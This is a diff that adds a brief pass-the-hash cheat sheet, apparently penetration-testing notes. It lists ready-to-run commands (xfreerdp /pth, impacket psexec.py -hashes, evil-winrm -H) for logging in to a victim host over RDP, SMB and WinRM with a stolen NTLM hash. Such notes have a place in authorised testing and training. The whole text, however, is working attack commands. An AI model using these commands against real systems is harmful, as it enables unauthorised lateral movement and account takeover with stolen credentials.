@@ -1,0 +1,9 @@
+Connect to RDP using PtH:
+    xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+
+Connect via psexec using PtH:
+    psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+    Note: Only the linux version of psexec support PtH.
+
+Connect to WinRM using PtH:
+    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
